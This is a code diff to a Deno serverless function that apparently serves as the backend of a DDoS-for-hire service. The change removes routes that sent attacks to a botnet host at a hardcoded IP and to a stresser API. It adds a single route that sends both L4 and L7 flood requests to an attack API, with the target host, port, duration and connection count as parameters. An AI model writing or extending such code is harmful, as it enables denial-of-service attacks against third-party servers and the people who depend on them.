@@ -71,30 +71,11 @@ serve(async (req) => {
 
     // 5. Build API URL using server-side secrets
     let apiUrl = '';
-
-    if (layer === 'L4') {
-      if (method === 'udp-botnet') {
-        const boostHost = Deno.env.get('BOTNET_HOST') ?? '91.92.42.92';
-        const boostUser = Deno.env.get('BOTNET_USER') ?? '';
-        const boostPass = Deno.env.get('BOTNET_PASS') ?? '';
-        apiUrl = `http://${boostHost}/api/attack?username=${boostUser}&password=${boostPass}&host=${target}&time=${time}&port=${port || 80}&method=udpbig`;
-      } else {
-        const apiKey = Deno.env.get('RETROSTRESS_API_KEY') ?? '';
-        let apiMethod = method;
-        if (method === 'game') apiMethod = 'UDP-BIG';
-        // Ensure method is uppercase for retrostress if needed, though they might accept lowercase.
-        // Assuming we pass it as provided by frontend or uppercase it if backend strictly needs uppercase
-        apiUrl = `https://retrostress.net/api/start?key=${apiKey}&target=${target}&port=${port || 80}&time=${time}&method=${apiMethod.toUpperCase()}&concurrent=${conns || 1}`;
-      }
-    } else if (layer === 'L7') {
-      const l7Token = Deno.env.get('L7_API_TOKEN') ?? '';
-      const rMethod = reqMethod || 'GET';
-      apiUrl = `https://api.l7srv.st/attack?token=${l7Token}&host=${encodeURIComponent(target)}&port=${port || 80}&time=${time}&method=${method}&concs=${conns || 1}&reqmethod=${rMethod}`;
-    } else {
-      return new Response(JSON.stringify({ success: false, error: 'Invalid layer.' }), {
-        status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' }
-      });
-    }
+    const l7Token = Deno.env.get('L7_API_TOKEN') ?? '';
+    const rMethod = reqMethod || 'GET';
+    
+    // Both L4 and L7 now use the same API structure as requested
+    apiUrl = `https://api.l7srv.st/attack?token=${l7Token}&host=${encodeURIComponent(target)}&port=${port || 80}&time=${time}&method=${method}&concs=${conns || 1}&reqmethod=${rMethod}`;
 
     // 6. Call upstream API — return real response/error to client
     try {
